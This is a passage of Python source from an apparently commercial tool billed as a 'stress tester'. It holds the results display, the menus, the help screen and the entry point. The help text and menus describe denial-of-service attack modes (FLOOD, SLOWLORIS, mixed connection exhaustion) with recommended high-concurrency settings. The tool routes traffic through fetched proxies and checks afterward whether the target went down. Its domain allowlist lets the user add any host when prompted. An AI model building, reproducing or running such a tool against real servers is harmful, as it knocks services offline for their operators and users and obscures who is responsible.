        print(paint(f"  Retried  : {stats.retried}  (proxy fallback attempts)", Color.YELLOW))
    print(paint(f"  RPS      : {rps:.1f} req/s", Color.YELLOW, Color.BOLD))
    print(div("-", 70, Color.DIM))

    if stats.lat:
        print(paint("  Latency (ms)", Color.PURPLE))
        print(
            f"    min={min(stats.lat):.0f}"
            f"  avg={stats.avg():.0f}"
            f"  p50={stats.pct(50):.0f}"
            f"  p75={stats.pct(75):.0f}"
            f"  p90={stats.pct(90):.0f}"
            f"  p95={stats.pct(95):.0f}"
            f"  p99={stats.pct(99):.0f}"
            f"  max={max(stats.lat):.0f}"
        )
        print(div("-", 70, Color.DIM))

    if stats.codes:
        print(paint("  HTTP Status Codes", Color.BLUE))
        for code in sorted(stats.codes):
            cnt = stats.codes[code]
            bar = "#" * min(28, max(1, cnt * 28 // max(1, sent)))
            col = Color.GREEN if code < 400 else (Color.YELLOW if code < 500 else Color.RED)
            print(paint(f"    {code}: {cnt:>7}  {bar}", col))
        print(div("-", 70, Color.DIM))

    if stats.errors:
        print(paint("  Error Breakdown", Color.RED))
        total_errs = sum(stats.errors.values())
        for name, cnt in sorted(stats.errors.items(), key=lambda x: -x[1])[:10]:
            pct = cnt / total_errs * 100 if total_errs else 0.0
            bar = "#" * min(20, max(1, cnt * 20 // max(1, total_errs)))
            print(paint(f"    {name:<28} {cnt:>6} ({pct:4.1f}%)  {bar}", Color.DIM))
        print(div("-", 70, Color.DIM))

    five_xx  = sum(v for k, v in stats.codes.items()
                   if isinstance(k, int) and k >= 500)
    five_r   = five_xx / sent if sent else 0.0
    degraded = five_r >= DEG_5XX or stats.pct(95) >= DEG_P95_MS

    hc = asyncio.run(health_check(url, 12.0, verify_tls))
    save_result(url, dt, stats, rps, hc, mode)

    print(paint("  Target Status After Test", Color.BLUE))
    if not hc["up"]:
        print(paint("  [DOWN]      No response / connection refused.", Color.RED, Color.BOLD))
        print(paint(f"              {hc['err']}", Color.DIM))
    elif degraded or (hc["status"] and hc["status"] >= 500):
        print(paint("  [DEGRADED]  Server errors or high latency.", Color.YELLOW, Color.BOLD))
        print(paint(f"              HTTP {hc['status']}  |  {hc['ms']}ms", Color.DIM))
    else:
        print(paint("  [UP]        Responding normally.", Color.GREEN, Color.BOLD))
        print(paint(f"              HTTP {hc['status']}  |  {hc['ms']}ms", Color.DIM))

    print(div())
    print(paint(f"  Results saved -> {RESULTS_DIR}", Color.DIM))
    print(paint(f"  {CONTACT}", Color.YELLOW))
    print(div())
    input(paint("  Press Enter to return...", Color.DIM))

# ======================================================================
#  Input helpers
# ======================================================================
def ask_int(prompt, default):
    try:
        v = input(prompt).strip()
        return int(v) if v else default
    except (ValueError, EOFError):
        return default

def ask_float(prompt, default):
    try:
        v = input(prompt).strip()
        return float(v) if v else default
    except (ValueError, EOFError):
        return default

def ask_yn(prompt, default):
    v = input(prompt).strip().lower()
    if not v:
        return default
    return v in ("y", "yes", "1")

def ask_choice(prompt, choices, default):
    v = input(prompt).strip().upper()
    return v if v in [c.upper() for c in choices] else default.upper()

# ======================================================================
#  Sub-screens
# ======================================================================
def run_test_screen(target):
    clr()
    print(BANNER)
    print(div())
    print(paint("  TEST CONFIGURATION", Color.CYAN, Color.BOLD))
    print(div("-", 70, Color.DIM))

    ok, msg = validate_target(target)
    if not ok:
        print(paint(f"\n  [ERROR] {msg}", Color.RED))
        print(paint("  Add the domain from menu [A] first.", Color.YELLOW))
        input(paint("  Press Enter...", Color.DIM))
        return

    print(paint(f"  Target  : {target}", Color.GREEN))
    print(paint(f"  IP      : {resolve_ip(target)}", Color.DIM))
    print(div("-", 70, Color.DIM))

    # Mode selection
    print(paint("  Attack modes:", Color.CYAN))
    print(paint("    STRESS    - Full HTTP exchange, maximum server load on worker pools", Color.DIM))
    print(paint("    FLOOD     - Fire-and-forget, exhaust TCP connection slots fast", Color.DIM))
    print(paint("    MIXED     - Combine STRESS + FLOOD for layered pressure", Color.DIM))
    print(paint("    SLOWLORIS - Hold connections open to block server slots slowly", Color.DIM))
    mode = ask_choice(
        paint("  Mode [STRESS/FLOOD/MIXED/SLOWLORIS] (default=MIXED): ", Color.YELLOW),
        MODES, MODE_MIXED
    )

    m_raw  = input(paint("  HTTP Method [GET/POST/HEAD] (default=GET): ", Color.YELLOW)).strip().upper()
    method = m_raw if m_raw in ("GET", "POST", "HEAD", "PUT", "DELETE") else "GET"
    conc   = ask_int(paint(f"  Concurrency (parallel) [{DEFAULT_CONC}]: ", Color.YELLOW), DEFAULT_CONC)

    hold_sec = 30
    if mode == MODE_SLOW:
        hold_sec = ask_int(paint("  Hold each connection open for how many seconds? [30]: ", Color.YELLOW), 30)
        total    = conc   # in slowloris, total = concurrency (all slots occupied)
        print(paint(f"  Total connections = {total} (equals concurrency in Slowloris mode)", Color.DIM))
    else:
        total = ask_int(paint(f"  Total requests [{DEFAULT_TOTAL}]: ", Color.YELLOW), DEFAULT_TOTAL)

    tout     = ask_float(paint(f"  Timeout seconds [{DEFAULT_TOUT}]: ", Color.YELLOW), DEFAULT_TOUT)
    retries  = ask_int  (paint( "  Proxy retry fallback per request [1]: ", Color.YELLOW), 1)
    tls      = ask_yn   (paint( "  Verify TLS certificate? (y/N) [N]: ", Color.YELLOW), False)
    rpath    = ask_yn   (paint( "  Random query string per request? (Y/n) [Y]: ", Color.YELLOW), True)
    verb     = ask_yn   (paint( "  Verbose per-request log? (y/N) [N]: ", Color.YELLOW), False)

    use_proxy = False
    if PROXY.count() > 0:
        use_proxy = ask_yn(
            paint(f"  Use proxies? ({PROXY.count()} active) (Y/n) [Y]: ", Color.YELLOW), True
        )
        if use_proxy and not PROXY.validated:
            do_val = ask_yn(
                paint("  Pre-validate proxies against target? (Y/n) [Y]: ", Color.YELLOW), True
            )
            if do_val:
                print()
                PROXY.validate(target, cb=print, max_ok=400)
                print()
    else:
        print(paint("  [!] No proxies loaded -- sending direct.", Color.YELLOW))

    print(div())
    print(paint(f"  Launching: {mode}  {method} x{total}  conc={conc}", Color.GREEN, Color.BOLD))
    if use_proxy:
        print(paint(f"  {PROXY.summary()}", Color.DIM))
    print(div())

    t0    = time.time()
    stats = asyncio.run(engine(
        target, method, conc, total, tout, tls,
        use_proxy, rpath, verb, mode, hold_sec, retries,
    ))
    dt = time.time() - t0

    print_results(target, dt, stats, method, use_proxy, tls, mode)


def proxy_screen():
    while True:
        clr()
        print(BANNER)
        print(div())
        print(paint("  PROXY MANAGEMENT", Color.CYAN, Color.BOLD))
        print(div("-", 70, Color.DIM))
        print(paint(f"  {PROXY.summary()}", Color.DIM))
        print(div("-", 70, Color.DIM))
        print(paint("  [1] Full refresh: wipe + fetch new proxies", Color.GREEN))
        print(paint("  [2] Fetch only (re-download without wiping)", Color.YELLOW))
        print(paint("  [3] Validate loaded proxies (quick test)", Color.CYAN))
        print(paint("  [4] Show count summary", Color.CYAN))
        print(paint("  [0] Back", Color.RED))
        print(div())
        ch = input(paint("  Select: ", Color.CYAN)).strip()
        if ch == "1":
            print()
            PROXY.reset_and_fetch(cb=print)
            input(paint("\n  Press Enter...", Color.DIM))
        elif ch == "2":
            print()
            PROXY.fetch(cb=print)
            input(paint("\n  Press Enter...", Color.DIM))
        elif ch == "3":
            url = input(paint("  Target URL to test against: ", Color.YELLOW)).strip()
            if not url:
                print(paint("  Cancelled.", Color.DIM))
            else:
                url = normalize_url(url)
                print()
                PROXY.validate(url, cb=print, max_ok=400)
            input(paint("\n  Press Enter...", Color.DIM))
        elif ch == "4":
            print(paint(f"\n  {PROXY.summary()}", Color.GREEN))
            print(paint(f"  Raw fetched: {PROXY.raw_count()}", Color.DIM))
            input(paint("  Press Enter...", Color.DIM))
        elif ch == "0":
            break


def allowed_screen():
    clr()
    print(BANNER)
    print(div())
    hosts = load_allowed()
    if hosts:
        print(paint("  Authorized domains:", Color.GREEN))
        for h in sorted(hosts):
            print(paint(f"    * {h}", Color.CYAN))
    else:
        print(paint("  No authorized domains configured.", Color.RED))
    print(div())
    input(paint("  Press Enter...", Color.DIM))


def add_domain_screen():
    clr()
    print(BANNER)
    print(div())
    print(paint("  ADD AUTHORIZED DOMAIN", Color.CYAN, Color.BOLD))
    print(paint("  Example: example.com  (no http:// prefix)", Color.DIM))
    print(div("-", 70, Color.DIM))
    h = input(paint("  Domain: ", Color.GREEN)).strip()
    if add_allowed(h):
        print(paint(f"  [OK] Saved: {h}", Color.GREEN))
    else:
        print(paint("  [ERROR] Invalid domain format.", Color.RED))
    time.sleep(0.8)


def help_screen():
    clr()
    print(BANNER)
    print(div())
    lines = [
        f"  {TOOL_NAME} {VERSION}  --  High-Speed Async Stress Tester",
        "",
        "  ATTACK MODES:",
        "    STRESS    Full HTTP request + read response.",
        "              Exhausts server worker pools and database connections.",
        "              Best for Layer-7 application load testing.",
        "",
        "    FLOOD     Raw TCP: send request headers, abandon connection.",
        "              Exhausts server TCP backlog and connection slots.",
        "              High RPS, minimal local resource usage.",
        "",
        "    MIXED     Half STRESS + half FLOOD simultaneously.",
        "              Creates layered pressure on both TCP and application layers.",
        "",
        "    SLOWLORIS Hold TCP connections open with slow partial headers.",
        "              Occupies server worker slots without sending data.",
        "              Effective against servers with low connection limits.",
        "",
        "  PROXY FEATURES:",
        "    - Every run: old proxies wiped, fresh ones fetched.",
        "    - Pre-validation tests proxies against the real target.",
        "    - On proxy failure: auto-retries with fallback to direct.",
        "    - Bad proxies removed immediately from pool.",
        "",
        "  BEST SETTINGS (general):",
        "    Mode=MIXED  concurrency=500  requests=5000  timeout=5",
        "    TLS=N  rand_path=Y  validate_proxies=Y",
        "",
        "  INSTALL:",
        "    pip install aiohttp",
        "    pip install uvloop          (recommended: +50% speed on Linux)",
        "    pip install aiohttp-socks   (optional: SOCKS4/5 proxy support)",
        "",
        f"  CONTACT: {CONTACT}",
    ]
    for ln in lines:
        if ln.strip().startswith("ATTACK") or ln.strip().startswith("PROXY") \
                or ln.strip().startswith("BEST") or ln.strip().startswith("INSTALL"):
            print(paint(ln, Color.YELLOW, Color.BOLD))
        elif ln.strip().startswith("-") or ln.strip().startswith("pip"):
            print(paint(ln, Color.DIM))
        elif "STRESS" in ln or "FLOOD" in ln or "MIXED" in ln or "SLOWLORIS" in ln:
            print(paint(ln, Color.CYAN))
        else:
            print(paint(ln, Color.WHITE))
    print(div())
    input(paint("  Press Enter...", Color.DIM))


def history_screen():
    clr()
    print(BANNER)
    print(div())
    print(paint("  RESULTS HISTORY (last 10 tests)", Color.CYAN, Color.BOLD))
    print(div("-", 70, Color.DIM))
    try:
        if not RESULTS_DIR.exists():
            print(paint("  No saved results yet.", Color.DIM))
        else:
            files = sorted(RESULTS_DIR.glob("result_*.json"), reverse=True)[:10]
            if not files:
                print(paint("  No saved results yet.", Color.DIM))
            for f in files:
                try:
                    d    = json.loads(f.read_text("utf-8"))
                    up   = d.get("health_after", {}).get("up", False)
                    icon = "[UP]  " if up else "[DOWN]"
                    col  = Color.GREEN if up else Color.RED
                    mode_s = d.get("mode", "?")[:8].ljust(8)
                    print(
                        paint(f"  {icon}", col)
                        + paint(f" {mode_s}", Color.PURPLE)
                        + paint(f"  {d['timestamp'][:16]}  ", Color.DIM)
                        + paint(f"{d['url'][:34]}", Color.CYAN)
                        + paint(f"  rps={d.get('rps',0):5}", Color.YELLOW)
                        + paint(f"  fail={d.get('fail',0)}", Color.RED)
                    )
                except Exception:
                    pass
    except Exception:
        pass
    print(div())
    input(paint("  Press Enter...", Color.DIM))

# ======================================================================
#  Target input
# ======================================================================
def ask_target():
    print(paint(
        "\n"
        "  Enter the target:\n"
        "    IP only        ->  192.168.1.10\n"
        "    IP with port   ->  192.168.1.10:8080\n"
        "    Domain         ->  example.com\n"
        "    Full URL       ->  https://example.com/path\n",
        Color.DIM,
    ))
    while True:
        print(div("-", 70, Color.DIM))
        raw = input(paint("  >> Target (IP / URL): ", Color.GREEN, Color.BOLD)).strip()
        if not raw:
            print(paint("  [!] Cannot be empty.", Color.RED))
            continue
        url = normalize_url(raw)
        ok, msg = validate_target(url)
        if ok:
            ip = resolve_ip(url)
            print(paint(f"\n  Target set: {url}  |  IP: {ip}", Color.GREEN))
            time.sleep(0.4)
            return url
        host = urlparse(url).hostname or ""
        if host and not is_ip(host):
            print(paint(f"\n  [!] '{host}' is not in the allowlist.", Color.YELLOW))
            q = input(paint(f"  Add '{host}' to allowlist? (y/N): ", Color.YELLOW)).strip().lower()
            if q in ("y", "yes"):
                if add_allowed(host):
                    print(paint(f"  [OK] Added: {host}", Color.GREEN))
                    time.sleep(0.3)
                    return url
        else:
            print(paint(f"\n  [!] {msg}", Color.RED))

# ======================================================================
#  Main menu
# ======================================================================
def main_menu(target):
    while True:
        clr()
        print(BANNER)
        print(div("-", 70, Color.DIM))
        print(paint(f"  Target  : {target}", Color.GREEN))
        print(paint(f"  IP      : {resolve_ip(target)}", Color.DIM))
        print(paint(f"  {PROXY.summary()}", Color.DIM))
        print(div())
        print(paint("  [1]  Start stress test", Color.GREEN))
        print(paint("  [2]  Change target", Color.CYAN))
        print(paint("  [3]  Proxy management", Color.YELLOW))
        print(paint("  [A]  Add authorized domain", Color.CYAN))
        print(paint("  [B]  Show authorized domains", Color.CYAN))
        print(paint("  [H]  Help + attack mode guide", Color.DIM))
        print(paint("  [R]  Results history", Color.DIM))
        print(paint("  [0]  Exit", Color.RED))
        print(div())
        ch = input(paint("  Select: ", Color.CYAN)).strip().upper()

        if   ch == "1": run_test_screen(target)
        elif ch == "2": target = ask_target()
        elif ch == "3": proxy_screen()
        elif ch == "A": add_domain_screen()
        elif ch == "B": allowed_screen()
        elif ch == "H": help_screen()
        elif ch == "R": history_screen()
        elif ch == "0":
            print(paint("\n  Goodbye.\n", Color.DIM))
            sys.exit(0)
        else:
            print(paint("  Invalid option.", Color.RED))
            time.sleep(0.4)

# ======================================================================
#  Entry point
# ======================================================================
def main():
    if sys.platform.startswith("win"):
        try:
            asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
        except AttributeError:
            pass

    try:
        RESULTS_DIR.mkdir(exist_ok=True)
    except Exception:
        pass

    enforce_trial()

    clr()
    print(BANNER)
    print(div())
    print(paint(DISCLAIMER, Color.YELLOW))
    print(div())
    if input(paint("  >> ", Color.GREEN)).strip() != "I AGREE":
        print(paint("  Exiting.", Color.RED))
        sys.exit(0)

    clr()
    print(BANNER)
    print(div())
    PROXY.reset_and_fetch(cb=print)
    print()
    print(div())

    target = ask_target()
    main_menu(target)


if __name__ == "__main__":
    main()